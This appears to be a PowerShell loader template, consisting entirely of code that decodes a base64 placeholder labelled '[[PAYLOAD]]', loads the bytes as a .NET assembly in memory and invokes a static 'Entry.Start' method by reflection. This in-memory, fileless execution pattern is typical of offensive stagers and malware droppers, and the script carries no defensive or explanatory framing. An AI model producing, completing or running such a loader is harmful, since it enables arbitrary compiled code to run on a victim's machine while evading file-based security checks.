$b64 = "[[PAYLOAD]]"
$bytes = [System.Convert]::FromBase64String($b64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod =  $assembly.GetTypes().Where({ $_.Name -eq 'Entry' }, 'First').GetMethod('Start', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, ($null))